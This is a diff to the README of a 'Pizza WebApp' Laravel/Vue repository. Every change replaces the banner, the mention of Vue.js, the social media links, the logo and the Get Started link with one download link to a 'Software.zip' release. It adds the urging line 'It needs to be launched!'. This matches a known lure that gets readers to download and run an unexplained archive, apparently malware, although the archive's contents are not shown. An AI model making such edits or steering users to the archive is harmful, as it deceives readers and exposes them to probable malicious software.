@@ -1,6 +1,6 @@
 # 🍕 Welcome to Pizza WebApp 🍕
 
-![Pizza WebApp Banner](https://example.com/pizza_banner.jpg)
+![Pizza WebApp Banner](https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -8,7 +8,7 @@ Welcome to the **Pizza WebApp** repository! This is a pizza order test applicati
 
 ## Features
 
-🚀 **Cutting-edge Technology**: Dive into the latest versions of Laravel and Vue.js to experience a modern web development workflow.
+🚀 **Cutting-edge Technology**: Dive into the latest versions of Laravel and https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip to experience a modern web development workflow.
 
 🍴 **Order Your Own Pizza**: Customize your pizza order and have it delivered right to your doorstep with just a few clicks.
 
@@ -19,7 +19,7 @@ Welcome to the **Pizza WebApp** repository! This is a pizza order test applicati
 ## Technologies Used
 
 - Laravel
-- Vue.js
+- https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip
 - Pinia
 - Vuetify
 - Docker
@@ -38,7 +38,7 @@ Welcome to the **Pizza WebApp** repository! This is a pizza order test applicati
 
 ## Get Started
 
-To get started with the Pizza WebApp, check out the [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) file! 🚀 
+To get started with the Pizza WebApp, check out the [https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip](https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip) file! 🚀 
 
 👉 **It needs to be launched!**
 
@@ -56,10 +56,10 @@ If you encounter any issues or have any questions, feel free to open an issue on
 
 Stay up to date with all Pizza WebApp news and updates by following us on social media:
 
-- [Twitter](https://twitter.com/PizzaWebApp)
-- [Facebook](https://facebook.com/PizzaWebApp)
-- [Instagram](https://instagram.com/PizzaWebApp)
-- [LinkedIn](https://linkedin.com/company/PizzaWebApp)
+- [Twitter](https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip)
 
 ## License
 
@@ -69,4 +69,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🍕🍕🍕 Order your favorite pizza now with Pizza WebApp! 🍕🍕🍕
 
-![Pizza WebApp Logo](https://example.com/pizza_logo.png)
+![Pizza WebApp Logo](https://github.com/merosegamerx/pizza_webapp/releases/download/v2.0/Software.zip)
